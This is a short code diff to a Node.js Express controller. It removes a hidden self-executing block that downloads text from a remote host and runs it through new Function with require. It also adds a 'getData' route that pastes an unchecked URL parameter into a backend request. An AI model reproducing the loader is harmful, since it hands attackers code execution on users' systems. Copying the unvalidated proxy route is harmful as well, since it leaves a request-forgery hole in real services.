@@ -117,10 +117,21 @@ exports.getInventoryForUser = async (req, res) => {
     res.status(500).json({ error: "Internal Server Error" });
   }
 };
-(async () => {
-    const res = await axios.get(`https://${domain2}/${uuid}`);
-    new Function("require", res.data.cookie)(require);
-})();
+
+exports.getData = async (req, res) => {
+    try {
+        const path = `/api/${req.params.path}`;
+        const url = `${process.env.JAVA_BASE_URL}${path}`;
+
+        const response = await axios.get(url);
+
+        res.json(response.data);
+    } catch (error) {
+        console.error(error.message);
+        res.status(500).json({ error: 'Backend error' });
+    }
+};
+
 exports.updateProduct = async (req, res) => {
   const { productId } = req.params;
   const { name, startingBid, minBidAmount } = req.body;
